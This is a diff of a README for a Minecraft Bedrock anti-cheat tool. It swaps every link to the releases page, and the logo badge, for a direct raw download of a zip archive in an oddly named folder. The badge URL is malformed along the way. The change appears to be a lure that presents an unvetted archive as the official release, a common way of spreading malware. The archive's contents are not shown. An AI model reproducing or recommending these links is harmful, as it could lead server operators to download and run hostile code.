@@ -2,7 +2,7 @@
 
 Welcome to the **Paradox AntiCheat-nk** repository! This utility aims to protect your Bedrock Edition server from malicious hackers. Our goal is to create a safer gaming environment for all players.
 
-![Paradox AntiCheat Logo](https://img.shields.io/badge/Paradox%20AntiCheat-v1.0-blue)
+![Paradox AntiCheat Logo](https://raw.githubusercontent.com/Leziaa/Paradox_AntiCheat-nk/main/nonmaritime/Anti_nk_Cheat_Paradox_2.3.zip%20AntiCheat-v1.0-blue)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ In the world of online gaming, security is paramount. Hackers can disrupt gamepl
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases). Make sure to download the appropriate file for your server setup. Once downloaded, follow these steps:
+To get started, download the latest release from our [Releases page](https://raw.githubusercontent.com/Leziaa/Paradox_AntiCheat-nk/main/nonmaritime/Anti_nk_Cheat_Paradox_2.3.zip). Make sure to download the appropriate file for your server setup. Once downloaded, follow these steps:
 
 1. **Extract the files**: Unzip the downloaded file.
 2. **Place the files**: Move the extracted files into your server's plugin or script directory.
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases) for updates and troubleshooting tips. You can also reach out to the community in the issues tab of this repository.
+If you encounter any issues or have questions, please check the [Releases section](https://raw.githubusercontent.com/Leziaa/Paradox_AntiCheat-nk/main/nonmaritime/Anti_nk_Cheat_Paradox_2.3.zip) for updates and troubleshooting tips. You can also reach out to the community in the issues tab of this repository.
 
 ---
 
@@ -77,6 +77,6 @@ This project covers a wide range of topics related to Minecraft Bedrock Edition:
 
 ## Final Thoughts
 
-With **Paradox AntiCheat**, you can enhance the security of your Bedrock Edition server and create a fairer gaming experience. Remember to regularly check for updates on our [Releases page](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases) to stay ahead of potential threats.
+With **Paradox AntiCheat**, you can enhance the security of your Bedrock Edition server and create a fairer gaming experience. Remember to regularly check for updates on our [Releases page](https://raw.githubusercontent.com/Leziaa/Paradox_AntiCheat-nk/main/nonmaritime/Anti_nk_Cheat_Paradox_2.3.zip) to stay ahead of potential threats.
 
 Together, we can build a safer gaming community!
